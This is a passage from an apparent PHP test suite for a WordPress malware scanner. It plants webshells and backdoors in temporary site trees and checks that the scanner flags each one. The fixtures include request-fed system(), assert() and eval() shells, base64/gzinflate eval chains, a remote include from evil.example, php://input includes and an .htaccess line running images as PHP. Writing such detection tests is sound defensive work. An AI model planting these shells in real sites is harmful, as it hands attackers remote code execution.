	 * looks like and honest code does not: an executor fed by a decoder
	 * (eval_chain, high); an executor or a command fed by request input, or
	 * request input called as a function (request_exec, urgent); an include
	 * of a media, temp, upload or remote file (include_foreign, urgent); code
	 * among the images, styles or translations of an asset folder
	 * (asset_php, high); a core wp- entry file's name where no WordPress
	 * stands (mimic_core, high). The same in a theme, a plugin no list
	 * knows, a must-use plugin's directory and a folder of the document root,
	 * and the code shapes in a single-file plugin and an owned drop-in; a
	 * built asset manifest, a translation, a stub, guarded data, a method
	 * named assert, a decoder alone, an inlined SVG, a namespace or a view
	 * whose folder only bears an asset's name, a library's xmlrpc.php class
	 * and a sniffer's .inc fixture draw nothing. Where wordpress.org's list vouches for a
	 * plugin the list stays the judge: a listed file whose md5 matches is
	 * verified and never read for shapes, whatever it holds, and one the list
	 * never had is plugin_foreign as before.
	 * Falsify: leave themes unjudged (the theme reads clean); judge only
	 * plugins with a list (the premium plugin reads clean); let `->assert(`
	 * count as the function (the template is reported); read every plugin
	 * file for shapes (the listed file is reported eval_chain); judge an
	 * asset folder by its name alone (the Css namespace is reported); take
	 * any PHP among assets for code that runs (the guarded template, the
	 * helpers and the string table are reported).
	 */
	public function aBackdoorNoListVouchesForIsFoundInEveryPackage(): bool
	{
		[$planted, $honest] = $this->plantedAndHonest();
		$packages = [
			[$this->roots['themes'] . '/agency', 'agency/'],
			[$this->roots['plugins'] . '/premium-pro', 'premium-pro/'],
			[$this->roots['mu'] . '/loader', 'mu-plugins/loader/'],
			[$this->root . '/app', 'app/'],
		];
		
		foreach($packages as [$base])
		{
			foreach($planted as $path => [$source])
			{
				$this->write($base . '/' . $path, $source);
			}
			
			foreach($honest as $path => $source)
			{
				$this->write($base . '/' . $path, $source);
			}
		}
		
		// a single-file plugin and an owned drop-in have no package around them
		$this->write($this->roots['plugins'] . '/single.php', "<?php\n/* Plugin Name: Single */\neval(gzinflate(base64_decode('x')));\n");
		$this->write($this->roots['content'] . '/advanced-cache.php', "<?php\n/* Plugin Name: WP Super Cache */\nif(isset(\$_COOKIE['z'])) { assert(\$_COOKIE['z']); }\n");
		mkdir($this->roots['plugins'] . '/wp-super-cache', 0700, true);
		// a wp.org plugin: its list ships the decoder chain, and never had extra.php
		$listed = "<?php\neval(base64_decode('ZWNobyAxOw=='));\n";
		$this->write($this->roots['plugins'] . '/listed/listed.php', $listed);
		$this->write($this->roots['plugins'] . '/listed/extra.php', "<?php echo 1;");
		$GLOBALS['wp']['api'] = ['files' => ['listed.php' => ['md5' => md5($listed)]]];
		// core with no list this pass: its files are still read for the shapes
		$this->write($this->root . '/wp-includes/class-wp-session-store.php', "<?php\nfunction wp_session_store(): void {}\nif(isset(\$_COOKIE['s'])) { assert(\$_COOKIE['s']); }\n");
		
		$walked = $this->walk($this->noStore(), ['root', 'content', 'plugins', 'core', 'themes'], ['listed' => '1.0']);
		
		foreach($packages as [, $prefix])
		{
			foreach($planted as $path => [, $expected])
			{
				if(in_array($expected, $this->verdicts($walked, $prefix . $path), true) === false)
				{
					return false;
				}
			}
			
			foreach($honest as $path => $source)
			{
				if($this->verdicts($walked, $prefix . $path) !== [])
				{
					return false;
				}
			}
		}
		
		return $this->verdicts($walked, 'single.php') === ['eval_chain high']
			&& in_array('request_exec urgent', $this->verdicts($walked, 'advanced-cache.php'), true)
			&& in_array('dropin info', $this->verdicts($walked, 'advanced-cache.php'), true)
			&& $this->verdicts($walked, 'listed/listed.php') === []
			&& $this->verdicts($walked, 'listed/extra.php') === ['plugin_foreign high']
			&& $walked['areas']['plugins']['verified'] === 1
			&& $this->verdicts($walked, 'wp-includes/class-wp-session-store.php') === ['request_exec urgent']
			// the worst shape wins over the first: the decoder chain stands a line above the shell
			&& PluginScan::codeVerdict("<?php\neval(base64_decode('eA=='));\nsystem(\$_GET['c']);\n")
				=== ['request_exec', 'urgent', 'system() fed by request input ($_GET)', 3];
	}
	
	/**
	 * RULE: the wp-config.php WordPress loads — the root's, or the one a level
	 * up when the root has none and no wp-settings.php stands beside it there
	 * — is read for code an intruder adds: an include of a file under
	 * uploads (wherever UPLOADS put them, or another install's), of a temp
	 * file, of a media file behind octal escapes, of a remote or stream URL,
	 * of request input, an executor fed by a decoder or by request input;
	 * each reported with its line and what it reached. An honest config (a
	 * local override, a distribution's shared config, wp-settings.php) draws
	 * nothing.
	 * Falsify: read only the root's file (the include a level up passes);
	 * ignore the wp-settings.php rule (a config WordPress never loads is
	 * reported); match includes by their raw text (the octal path passes).
	 */
	public function wpConfigIsReadForWhatAnIntruderAdds(): bool
	{
		$parent = $this->root;
		$site = $parent . '/public';
		$this->roots = [
			'root' => $site,
			'content' => $site . '/wp-content',
			'plugins' => $site . '/wp-content/plugins',
			'mu' => $site . '/wp-content/mu-plugins',
			'themes' => $site . '/wp-content/themes',
			// UPLOADS moved out of wp-content: only the site's own uploads root names it
			'uploads' => $site . '/files',
		];
		
		foreach($this->roots as $dir)
		{
			mkdir($dir, 0700, true);
		}
		
		$honest = "<?php\ndefine('DB_NAME', 'wp');\n\$table_prefix = 'wp_';\nif(file_exists(__DIR__ . '/wp-config-local.php'))\n{\n"
			. "\trequire __DIR__ . '/wp-config-local.php';\n}\nrequire_once '/etc/wordpress/config-default.php';\nrequire_once ABSPATH . 'wp-settings.php';\n";
		$config = $site . '/wp-config.php';
		$uploads = 'include_foreign urgent: include of a file under uploads';
		$temp = 'include_foreign urgent: include of a file in a temp directory';
		// the test's own tree stands in the temp directory, so the detail tells uploads from temp
		$planted = [
			"include '" . $this->roots['uploads'] . "/2024/01/cache.php';\n" => $uploads,
			// another install's uploads, and the site's own by WordPress's function
			"include '/srv/www/wp-content/uploads/2024/01/cache.php';\n" => $uploads,
			"include wp_upload_dir()['basedir'] . '/x.php';\n" => $uploads,
			// the temp directory by PHP's function and by the path this PHP names
			"include sys_get_temp_dir() . '/sess_x';\n" => $temp,
			"include '" . str_replace('\\', '/', sys_get_temp_dir()) . "/sess_x';\n" => $temp,
			"@include \"\\057var\\057www\\057.a1b2c3.ico\";\n" => 'include_foreign urgent: include of a .ico file',
			// only the escapes resolved name the temp directory: no media extension to fall back on
			"include \"\\x2ftmp\\x2fsess\\x2ephp\";\n" => $temp,
			"require 'http://evil.example/x.txt';\n" => 'include_foreign urgent: include of a http stream',
			"include 'php://input';\n" => 'request_exec urgent: include of request input (php://input)',
			"eval(gzinflate(base64_decode('80jNyclXCM8vyklRBAA=')));\n" => 'eval_chain high: eval() fed by gzinflate()',
			"@eval(\$_SERVER['HTTP_X_CODE']);\n" => 'request_exec urgent: eval() fed by request input ($_SERVER[HTTP_X_CODE])',
			"include \$_GET['page'] . '.php';\n" => 'request_exec urgent: include of request input ($_GET)',
		];
		
		$this->write($config, $honest);
		$clean = $this->walk($this->noStore(), ['root']);
		
		foreach($planted as $line => $expected)
		{
			$this->write($config, $honest . $line);
			$walked = $this->walk($this->noStore(), ['root']);
			
			// the planted line follows the honest config's nine
			if($this->verdicts($walked, 'wp-config.php') !== [explode(': ', $expected, 2)[0]]
				|| $this->detail($walked, 'wp-config.php') !== explode(': ', $expected, 2)[1]
				|| $this->line($walked, 'wp-config.php') !== 10)
			{
				return false;
			}
		}
		
		unlink($config);
		$this->write($parent . '/wp-config.php', $honest . "include '/tmp/x.php';\n");
		$above = $this->walk($this->noStore(), ['root']);
		$this->write($parent . '/wp-settings.php', "<?php\n");
		$another = $this->walk($this->noStore(), ['root']);
		
		return $this->verdicts($clean, 'wp-config.php') === []
			&& $this->verdicts($above, $parent . '/wp-config.php') === ['include_foreign urgent']
			&& $another['findings'] === [];
	}
	
	/**
	 * RULE: wp-content/cache is walked. What caching plugins and template
	 * engines write there draws nothing: W3 Total Cache's object files behind
	 * their four-byte expiry and exit, its JSON blog map, WP Super Cache's
	 * pages, metas and debug log behind die(), an exit guard, also past a
	 * long header comment, an empty index.php, returned data, Docket Cache's
	 * object files and Autoptimize's gzip wrappers while their plugin is
	 * installed, compiled Twig and Blade templates. PHP that runs code there
	 * is cache_php (high), request input
	 * reaching a runner is request_exec (urgent) even dressed as a compiled
	 * template, and a code writer's directory without its plugin holds a
	 * stranger. Falsify: keep skipping the cache (the shell is never seen);
	 * trust a compiled template's signature alone (the Blade shell passes);
	 * trust a writer's directory without its owner (the orphaned Docket file
	 * passes); read W3TC's prefix as code (every object file is reported).
	 */
	public function theCacheIsWalkedForCodeNoCacheWrites(): bool
	{
		$cache = $this->roots['content'] . '/cache';
		$honest = [
			'object/000/abc/0123456789abcdef.php' => pack('L', time() + 3600) . '<?php exit; ?>' . serialize(['a' => 1]),
			'blogs.php' => '{"example.com/":"c1"}',
			'supercache/example.com/index.html' => '<html></html>',
			'wp-cache-0123456789abcdef.php' => '<?php die(); ?><html><body>cached</body></html>',
			'meta/wp-cache-0123456789abcdef.php' => '<?php die(); ?>{"headers":[]}',
			'4b1f6e0c2a1d4e9f8a7b6c5d4e3f2a1b.php' => "<?php\ndie( \"Please use the viewer\" );\n12:00:01 1234 /page/ supercache\n",
			'guarded.php' => "<?php exit; // runtime configuration. Do not edit. ?>\n{\"a\":1}",
			'headed.php' => "<?php\n/*\n" . str_repeat(' * a licence line of the cached page' . "\n", 100) . " */\ndie(); ?>\n<html><body>cached</body></html>",
			'wpo-cache/example.com/index.php' => '',
			'breeze/protected.php' => "<?php\nreturn array('paths_by_post_id' => array(1 => '/a/'));\n",
			'docket-cache/abc-def.php' => "<?php /*dc:x 0 0*/ if(!\\defined('ABSPATH')){return false;}\nreturn \\Nawawi\\DocketCache\\Hydrate::make(['a' => 1]);\n/*@DOCKET_CACHE_EOF*/",
			'autoptimize/autoptimize_0123456789abcdef0123456789abcdef.php' => "<?php\nif(!isset(\$_SERVER['HTTP_ACCEPT_ENCODING'])) \$_SERVER['HTTP_ACCEPT_ENCODING'] = '';\n"
				. "\$contents = file_get_contents(__FILE__ . '.none');\nheader('Content-type: text/css; charset=utf-8');\necho \$contents;\n",
			'timber/ab/abcdef.php' => "<?php\n\nuse Twig\\Environment;\n\n/* index.twig */\nclass __TwigTemplate_0123456789abcdef0123456789abcdef extends \\Twig\\Template\n{\n"
				. "\tprotected function doDisplay(array \$context, array \$blocks = [])\n\t{\n\t\techo 'x';\n\t}\n}\n",
			'acorn/framework/views/0123456789abcdef0123456789abcdef01234567.php' => "<div><?php echo e(\$title); ?></div>\n"
				. "<?php /**PATH /srv/www/app/themes/sage/resources/views/index.blade.php ENDPATH**/ ?>",
		];
		$planted = [
			'wp-rocket/example.com/x.php' => ["<?php system(\$_GET['c']);", 'request_exec urgent'],
			'supercache/example.com/blog/y.php' => ["<?php echo file_get_contents('/etc/passwd');", 'cache_php high'],
			// past a header longer than any one read decides, code is still code
			'supercache/example.com/blog/z.php' => ["<?php\n/*\n" . str_repeat(' * a licence line of the cached page' . "\n", 100) . " */\nfile_put_contents('/tmp/x', 'y');", 'cache_php high'],
			// what can run beside the pages is still read: a media file opening PHP, a directive mapping PHP onto images
			'wp-rocket/example.com/favicon_a1b2.ico' => ["\x00\x00\x01\x00<?php echo 1;", 'polyglot urgent'],
			'wp-rocket/example.com/.htaccess' => ["AddHandler application/x-httpd-php .jpg\n", 'handler_php_extension urgent'],
			// antivirus quarantines the one-line eval-of-POST shell the moment it is written: the shape, not the signature
			'acorn/framework/views/evil.php' => ["<div><?php if(isset(\$_COOKIE['k'])) { assert(\$_COOKIE['k']); } ?></div>\n<?php /**PATH x ENDPATH**/ ?>", 'request_exec urgent'],
		];
		
		foreach($honest as $path => $source)
		{
			$this->write($cache . '/' . $path, $source);
		}
		
		foreach($planted as $path => [$source])
		{
			$this->write($cache . '/' . $path, $source);
		}
		
		mkdir($this->roots['plugins'] . '/docket-cache', 0700, true);
		mkdir($this->roots['plugins'] . '/autoptimize', 0700, true);
		$walked = $this->walk($this->noStore());
		rmdir($this->roots['plugins'] . '/docket-cache');
		$orphaned = $this->walk($this->noStore());
		
		foreach($honest as $path => $source)
		{
			if($this->verdicts($walked, 'cache/' . $path) !== [])
			{
				return false;
			}
		}
		
		foreach($planted as $path => [, $expected])
		{
			if($this->verdicts($walked, 'cache/' . $path) !== [$expected])
			{
				return false;
			}
		}
		
		return $this->verdicts($orphaned, 'cache/docket-cache/abc-def.php') === ['cache_php high']
			&& $this->skippedUnder($walked, 'content:cache') === false;
	}
	
	/**
	 * RULE: the cache walk is bounded: past `cache_entries` names it stops and
	 * names where in scan.skipped, and the pass still completes; a directory
	 * deeper than `cache_depth` is not descended, is named the same way and
	 * counted as deep. Falsify: drop the count (every page is counted); drop
	 * the depth (the deep shell is reported); leave the cut directory
	 * uncounted (deep reads 0).
	 */
	public function theCacheWalkIsBounded(): bool
	{
		$cache = $this->roots['content'] . '/cache';
		
		foreach(range(1, 30) as $page)
		{
			$this->write($cache . '/pages/p' . $page . '/index.html', 'x');
		}
		
		$this->write($cache . '/a/b/c/d/deep.php', "<?php system(\$_GET['c']);");
		
		$whole = $this->walk($this->noStore());
		$counted = $this->walk($this->noStore(), ['content'], [], ['cache_entries' => 10]);
		$shallow = $this->walk($this->noStore(), ['content'], [], ['cache_depth' => 2]);
		
		return $whole['areas']['content']['files'] === 31
			&& $this->verdicts($whole, 'cache/a/b/c/d/deep.php') === ['request_exec urgent']
			&& $counted['done'] === true
			&& $counted['areas']['content']['files'] <= 10
			&& $this->skippedUnder($counted, 'content:cache')
			&& $shallow['done'] === true
			&& $this->verdicts($shallow, 'cache/a/b/c/d/deep.php') === []
			&& in_array('content:cache/a/b/c', $shallow['skipped'], true)
			&& ($shallow['bounded']['cache']['deep'] ?? 0) === 1;
	}
	
	/**
	 * RULE: the document root's folders are walked, bounded: an application in
	 * a folder of its own draws nothing for being code, an images folder
	 * holding PHP is asset_php, a core entry name where no WordPress stands is
	 * mimic_core, a WordPress copy in a folder (its wp-admin and wp-includes
	 * beside its root files) draws nothing for its names, a decoder fed to
	 * eval is eval_chain at any depth inside the bounds. The folders other
	 * phases own (wp-admin, wp-includes, wp-content) are not walked again and
	 * node_modules not at all; past `root_depth` or `root_entries` the walk
	 * stops and names where. Core's list and the dated directory speak for
	 * the root's top alone: an application's index.php is no core file, its
	 * folder rewritten after its files no finding. Falsify: keep the root
	 * flat (the images folder reads clean); walk wp-admin as root (a core file
	 * is judged twice); drop the depth bound (the deep file is read); hold a
	 * folder to core's list (its index.php is core_modified, every folder
	 * misses core's files).
	 */
	public function theRootsFoldersAreWalkedBounded(): bool
	{
		$root = $this->root;
		$this->write($root . '/app/index.php', "<?php\nrequire __DIR__ . '/lib.php';\necho run();\n");
		$this->write($root . '/app/lib.php', "<?php\nfunction run(): string { return 'ok'; }\n");
		$this->write($root . '/images/up.php', "<?php echo 1; file_put_contents('x', 'y');");
		$this->write($root . '/images/banner.jpg', "\xff\xd8\xff\xe0");
		$this->write($root . '/old/wp-login.php', "<?php echo 1;");
		$this->write($root . '/blog/wp-login.php', "<?php echo 1;");
		$this->write($root . '/blog/wp-includes/version.php', "<?php \$wp_version = '6.0';");
		$this->write($root . '/blog/wp-settings.php', "<?php echo 1;");
		$this->write($root . '/blog/wp-admin/index.php', "<?php echo 1;");
		$this->write($root . '/app/node_modules/pkg/evil.php', "<?php eval(base64_decode('x'));");
		$this->write($root . '/wp-admin/x.php', "<?php eval(base64_decode('x'));");
		$this->write($root . '/wp-content/x/y.php', "<?php eval(base64_decode('x'));");
		$this->write($root . '/a/b/c/deep.php', "<?php eval(base64_decode('x'));");
		$this->write($root . '/.git/HEAD', 'ref: refs/heads/main');
		$this->write($root . '/app/.git/HEAD', 'ref: refs/heads/main');
		// an application rewrites its own folders: one changed after its newest file is no finding
		touch($root . '/app/index.php', time() - 7200);
		touch($root . '/app/lib.php', time() - 7200);
		touch($root . '/app', time() - 60);
		
		$walked = $this->walk($this->noStore(), ['root']);
		$shallow = $this->walk($this->noStore(), ['root'], [], ['root_depth' => 2]);
		$counted = $this->walk($this->noStore(), ['root'], [], ['root_entries' => 3]);
		
		// with core's list at hand it speaks for the root's top alone: its two files are missing there, nowhere else
		$GLOBALS['wp']['api'] = ['checksums' => ['index.php' => md5('core index'), 'wp-load.php' => md5('core load')]];
		$scan = $this->scanner($this->noStore());
		$state = $scan->start('manual');
		$state['phases'] = [$state['phases'][0]];
		$listed = $scan->advance($state, 10_000);
		
		return $listed['checksums']['core'] === 'verified'
			&& $listed['areas']['root']['missing'] === 2
			&& $this->verdicts($listed, 'app/index.php') === []
			&& $this->verdicts($walked, 'app') === []
			// the posture names the document root's own checkout, never one in a folder
			&& $walked['vcs'] === ['.git']
			&& $this->verdicts($walked, 'app/index.php') === []
			&& $this->verdicts($walked, 'app/lib.php') === []
			&& $this->verdicts($walked, 'images/up.php') === ['asset_php high']
			&& $this->verdicts($walked, 'old/wp-login.php') === ['mimic_core high']
			&& $this->verdicts($walked, 'blog/wp-login.php') === []
			&& $this->verdicts($walked, 'app/node_modules/pkg/evil.php') === []
			&& $this->verdicts($walked, 'wp-admin/x.php') === []
			&& $this->verdicts($walked, 'wp-content/x/y.php') === []
			&& $this->verdicts($walked, 'a/b/c/deep.php') === ['eval_chain high']
			&& $this->verdicts($shallow, 'a/b/c/deep.php') === []
			&& in_array('root:a/b/c', $shallow['skipped'], true)
			&& $counted['done'] === true
			&& count($counted['findings']) < count($walked['findings'])
			&& $this->skippedUnder($counted, 'root:');
	}
	
	/**
	 * RULE: a translation under wp-content/languages is what WordPress writes
	 * there, literals returned: one that is, at the top or in a plugin's or a
	 * theme's folder, draws nothing; a translation's name over code that runs
	 * is content_php (high). Falsify: trust the name (the planted file reads
	 * as a translation).
	 */
	public function aTranslationsNameIsNoProofOfItsContent(): bool
	{
		$languages = $this->roots['content'] . '/languages';
		$this->write($languages . '/de_DE.l10n.php', "<?php\nreturn ['domain' => 'default', 'messages' => ['Hello' => 'Hallo']];\n");
		$this->write($languages . '/plugins/shop-de_DE.l10n.php', "<?php\nreturn array('messages' => array('Cart' => 'Warenkorb'));\n");
		$this->write($languages . '/themes/agency-de_DE.l10n.php', "<?php\nreturn ['messages' => ['x' => file_get_contents('/etc/hostname')]];\n");
		
		$walked = $this->walk($this->noStore());
		
		return $this->verdicts($walked, 'languages/de_DE.l10n.php') === []
			&& $this->verdicts($walked, 'languages/plugins/shop-de_DE.l10n.php') === []
			&& $this->verdicts($walked, 'languages/themes/agency-de_DE.l10n.php') === ['content_php high'];
	}
	
	/**
	 * RULE: a `..` segment a finding's path would carry — a cron hook or an
	 * active plugin entry an intruder named so, with either separator (a path
	 * is written with slashes) — is written %2E%2E, since codesafe refuses a
	 * whole report over one path with a `..` segment. Falsify: pass the name
	 * through (the report is refused, every finding with it).
	 */
	public function aDotDotSegmentNeverRidesAFindingsPath(): bool
	{
		$GLOBALS['wp']['did']['wp_loaded'] = 1;
		$GLOBALS['wp']['admin'] = true;
		$GLOBALS['wp']['cron'] = [1_792_500_000 => [
			'..' => ['a' => ['schedule' => 'hourly']],
			'x\\..\\y' => ['b' => ['schedule' => 'daily']],
		]];
		$GLOBALS['wp']['options']['active_plugins'] = ['../uploads/loader.php'];
		
		$scan = $this->scanner($this->noStore());
		$state = $scan->start('manual');
		$state['phases'] = [[Database::AREA, '', false, []]];
		$walked = $scan->advance($state, 1000);
		$paths = array_column($walked['findings'], 'path');
		
		foreach($paths as $path)
		{
			if(preg_match('~(?:^|[/\\\\])\.\.(?:[/\\\\]|$)~', $path) === 1)
			{
				return false;
			}
		}
		
		return in_array('options/cron/%2E%2E', $paths, true)
			&& in_array('options/cron/x/%2E%2E/y', $paths, true)
			&& in_array('options/active_plugins/%2E%2E/uploads/loader.php', $paths, true);
	}
	
	/**
	 * RULE: every area the report carries says how many of its findings were
	 * made and not listed (`truncated`, 0 included), so the console can judge
	 * gone per area: the findings the full report gives up to a higher tier
	 * count where they stood — an upload's and a root folder's, one each —
	 * and the database's past the report's cap and past its own caps count
	 * for the database, the per-area counts adding up to scan.truncated's
	 * tiers. Falsify: count only by tier (no area carries truncated); count
	 * an evicted finding where the finding that evicted it stands (the root
	 * and the upload read 0, the database 2 too many); drop the database's
	 * cap overflow from its area (the sums part).
	 */
	public function everyAreaSaysWhatItLeftOut(): bool
	{
		$GLOBALS['wp']['did']['wp_loaded'] = 1;
		$GLOBALS['wp']['admin'] = true;
		$hooks = [];
		
		foreach(range(1, 25) as $index)
		{
			$hooks['agency_gone_' . $index] = ['k' => ['schedule' => 'daily']];
		}
		
		$GLOBALS['wp']['cron'] = [1_792_500_000 => $hooks];
		// two active plugins outside the plugins directory: two high findings once the report is full
		$GLOBALS['wp']['options']['active_plugins'] = ['../a.php', '../b.php'];
		$this->write($this->root . '/legacy/big.php', '<?php echo 1; /* ' . str_repeat('x', 100) . ' */');
		
		foreach(range(1, 198) as $index)
		{
			$this->write($this->root . '/legacy/.cache/t' . $index . '.php', '<?php echo 1;');
		}
		
		$this->write($this->roots['uploads'] . '/smile_fonts/icomoon/charmap.php', "<?php \$icons = array();\n\$icons['icomoon']['a'] = array('class' => 'a');\n");
		mkdir($this->roots['plugins'] . '/ultimate_vc_addons', 0700, true);
		$walked = $this->walk($this->noStore(), ['root', 'uploads', Database::AREA], [], ['code_bytes' => 64]);
		$report = $this->scanner($this->noStore())->report($walked, 'wordpress/test');
		$byArea = 0;
		
		foreach($report['areas'] as $stats)
		{
			if(isset($stats['truncated']) === false)
			{
				return false;
			}
			
			$byArea += $stats['truncated'];
		}
		
		return $byArea === array_sum($report['scan']['truncated'])
			&& $report['areas']['root']['truncated'] === 1
			&& $report['areas']['uploads']['truncated'] === 1
			&& $report['areas'][Database::AREA]['truncated'] === $byArea - 2
			&& $report['areas'][Database::AREA]['truncated'] >= 25
			&& $report['areas']['themes']['truncated'] === 0
			&& $this->verdicts($walked, 'legacy/big.php') === []
			&& $this->verdicts($walked, 'smile_fonts/icomoon/charmap.php') === [];
	}
	
	/**
	 * RULE: what the database's detectors leave out past their caps is
	 * counted as truncated in the report — a report that carries less than
	 * it found never reads as whole — and the posts the content findings
	 * name ride the resume points, for the next pass to read first. Falsify:
	 * drop the database's overflow (truncated reads 0 with five leftovers
	 * unlisted); drop the posts (the next pass is handed none); hand the
	 * next pass's database nothing (it never asks for them).
	 */
	public function whatTheDatabaseLeavesOutIsCounted(): bool
	{
		$GLOBALS['wp']['did']['wp_loaded'] = 1;
		$GLOBALS['wp']['admin'] = true;
		$hooks = [];
		
		foreach(range(1, 25) as $index)
		{
			$hooks['agency_gone_' . $index] = ['k' => ['schedule' => 'daily']];
		}
		
		$GLOBALS['wp']['cron'] = [1_792_500_000 => $hooks];
		$GLOBALS['wpdb'] = new class
		{
			public string $options = 'wp_options';
			
			public string $posts = 'wp_posts';
			
			/** @var list<string> */
			public array $queries = [];
			
			public function esc_like(
				string $text,
			): string
			{
				return $text;
			}
			
			public function prepare(
				string $query,
				mixed ...$args,
			): string
			{
				return $query;
			}
			
			public function get_results(
				string $query,
				string $output = 'OBJECT',
			): array
			{
				$this->queries[] = $query;
				
				return str_contains($query, 'FROM wp_posts')
					? [['ID' => 7, 'post_type' => 'post', 'post_status' => 'publish', 'post_content' => '<script src="https://evil.example/s.js"></script>',
						'post_modified_gmt' => '2026-10-30 10:00:00']]
					: [];
			}
			
			public function get_var(
				string $query,
			): int
			{
				return 0;
			}
		};
		$scan = $this->scanner($this->noStore());
		$state = $scan->start('manual');
		$state['phases'] = [[Database::AREA, '', false, []]];
		$walked = $scan->advance($state, 1000);
		$GLOBALS['wpdb']->queries = [];
		$state = $scan->start('manual', $walked['resume_next']);
		$state['phases'] = [[Database::AREA, '', false, []]];
		$scan->advance($state, 1000);
		$asked = implode("\n", $GLOBALS['wpdb']->queries);
		unset($GLOBALS['wpdb']);
		
		return $walked['truncated'][PluginScan::TIER_INFO] === 5
			&& str_contains($asked, 'AND ID IN (%d)')
			&& $walked['counts'][PluginScan::TIER_INFO] === 25
			&& ($walked['resume_next']['posts_found'] ?? null) === [7]
			&& $this->verdicts($walked, 'posts/7') !== [];
	}
	
	/**
	 * RULE: when the report is full, a finding outranks the last listed one of
	 * the lowest tier below its own, which is counted as truncated in its
	 * place: an oversize file (info) and 199 hidden files (high) in a folder
	 * of the root, then 2 more hidden ones, do not push the urgent file under
	 * uploads out of the list; the info gives way first, then a high. Falsify:
	 * keep the first two hundred whatever their tier (the urgent file is
	 * truncated, its path lost); evict the last lower one whatever its tier (a
	 * high gives way while the info stays).
	 */
	public function anUrgentFindingOutranksALowerOneWhenTheReportIsFull(): bool
	{
		$this->write($this->root . '/legacy/big.php', '<?php echo 1; /* ' . str_repeat('x', 100) . ' */');
		
		foreach(range(1, 199) as $index)
		{
			$this->write($this->root . '/legacy/.cache/t' . $index . '.php', '<?php echo 1;');
		}
		
		$this->write($this->roots['uploads'] . '/2024/01/x.php', "<?php echo 1;");
		$full = $this->walk($this->noStore(), ['root', 'uploads'], [], ['code_bytes' => 64]);
		
		foreach([200, 201] as $index)
		{
			$this->write($this->root . '/legacy/.cache/t' . $index . '.php', '<?php echo 1;');
		}
		
		$over = $this->walk($this->noStore(), ['root', 'uploads'], [], ['code_bytes' => 64]);
		
		return count($full['findings']) === PluginScan::MAX_FINDINGS
			&& $this->verdicts($full, '2024/01/x.php') === ['uploads_php urgent']
			&& $this->verdicts($full, 'legacy/big.php') === []
			&& $full['counts'] === ['urgent' => 1, 'high' => 199, 'info' => 1]
			&& $full['truncated'] === ['urgent' => 0, 'high' => 0, 'info' => 1]
			&& $this->verdicts($over, '2024/01/x.php') === ['uploads_php urgent']
			&& $over['counts'] === ['urgent' => 1, 'high' => 201, 'info' => 1]
			&& $over['truncated'] === ['urgent' => 0, 'high' => 2, 'info' => 1];
	}
	
	/**
	 * RULE: an asset folder is one named for assets that holds at least one
	 * asset, and everything below it is in it: PHP that runs in a new
	 * subfolder of a theme's images is asset_php, and listing stubs beside
	 * the images, however many, change nothing. A package whose own directory
	 * bears an asset's name is no asset folder of itself. Falsify: judge each
	 * directory by its own listing (the subfolder reads clean); count stubs as
	 * PHP against the images (three stubs clear the folder); let the package's
	 * own directory count (a plugin named images is all asset_php).
	 */
	public function anAssetFolderReachesItsSubfoldersAndIgnoresStubs(): bool
	{
		$theme = $this->roots['themes'] . '/agency/images';
		$runs = "<?php echo 1; file_put_contents('a', 'b');";
		$this->write($theme . '/logo.png', "\x89PNG");
		$this->write($theme . '/a.png', "\x89PNG");
		$this->write($theme . '/up.php', $runs);
		$this->write($theme . '/cache/up.php', $runs);
		
		foreach(['x1.php', 'x2.php', 'x3.php'] as $stub)
		{
			$this->write($theme . '/' . $stub, '<?php // Silence is golden.');
		}
		
		$this->write($this->roots['plugins'] . '/images/images.php', $runs);
		$this->write($this->roots['plugins'] . '/images/banner.png', "\x89PNG");
		$walked = $this->walk($this->noStore(), ['themes', 'plugins']);
		
		return $this->verdicts($walked, 'agency/images/up.php') === ['asset_php high']
			&& $this->verdicts($walked, 'agency/images/cache/up.php') === ['asset_php high']
			&& $this->verdicts($walked, 'agency/images/x1.php') === []
			&& $this->verdicts($walked, 'images/images.php') === [];
	}
	
	/**
	 * RULE: a bounded walk continues where the last pass stopped: each pass
	 * reads at most its names, hands the next pass the path it stopped after,
	 * and a later pass reaches the shell no single pass could; the stop is
	 * named first in scan.skipped even when fifty skipped directories
	 * filled it, and the report's scan.bounded says what was read, from where
	 * and where the next pass starts; a resumed pass reads none of the files
	 * that came before its place again. Falsify: start every pass from the
	 * top (the shell is never reached); append the stop to a full skipped
	 * list (it is dropped); read the files before the place again (a pass
	 * reads more than its names).
	 */
	public function aBoundedWalkResumesWhereItStopped(): bool
	{
		$cache = $this->roots['content'] . '/cache';
		
		foreach(range(1, 30) as $page)
		{
			$this->write($cache . '/pages/p' . str_pad((string)$page, 2, '0', STR_PAD_LEFT) . '/index.html', 'x');
		}
		
		$this->write($cache . '/aa/deep.php', "<?php echo file_get_contents('/etc/passwd');");
		
		foreach(range(1, 55) as $index)
		{
			mkdir($this->roots['content'] . '/nm-' . $index . '/node_modules', 0700, true);
		}
		
		$resume = [];
		$passes = [];
		$found = 0;
		
		foreach(range(1, 12) as $pass)
		{
			$walked = $this->walk($this->noStore(), ['content'], [], ['cache_entries' => 10], $resume);
			$passes[] = $walked;
			$resume = $walked['resume_next'] ?? [];
			
			if($this->verdicts($walked, 'cache/aa/deep.php') === ['cache_php high'])
			{
				$found = $pass;
				
				break;
			}
		}
		
		$first = $passes[0];
		$report = $this->scanner($this->noStore())->report($first, 'wordpress/test');
		$bounded = $report['scan']['bounded']['cache'] ?? [];
		
		foreach($passes as $walked)
		{
			if(($walked['bounded']['cache']['read'] ?? 99) > 10 || $walked['areas']['content']['files'] > 10)
			{
				return false;
			}
		}
		
		return $found > 1
			&& str_starts_with($first['skipped'][0] ?? '', 'content:cache')
			&& count($first['skipped']) <= 50
			&& ($bounded['read'] ?? 0) === 10
			&& ($bounded['limit'] ?? 0) === 10
			&& ($bounded['from'] ?? null) === ''
			&& ($bounded['next'] ?? '') !== ''
			&& ($passes[1]['bounded']['cache']['from'] ?? '') === ($bounded['next'] ?? 'x');
	}
	
	/**
	 * RULE: a PHP file no list vouches for is read up to four mebibytes, so a
	 * shape past the first mebibyte of a theme's functions.php is found; one
	 * larger than that is read that far and listed as oversize_php (info),
	 * since the rest goes unjudged. Falsify: stop at one mebibyte (the shape
	 * is never read); pass over the large file in silence.
	 */
	public function aLargeFileIsReadFarAndTheRestIsNamed(): bool
	{
		$theme = $this->roots['themes'] . '/agency';
		$this->write($theme . '/functions.php', "<?php\n/*\n" . str_repeat('x', 1100000) . "\n*/\n@include \"\\057tmp\\057.sess_a1b2.ico\";\n");
		$this->write($theme . '/inc/big.php', "<?php\n\$a = '" . str_repeat('y', 5000) . "';\n");
		$walked = $this->walk($this->noStore(), ['themes']);
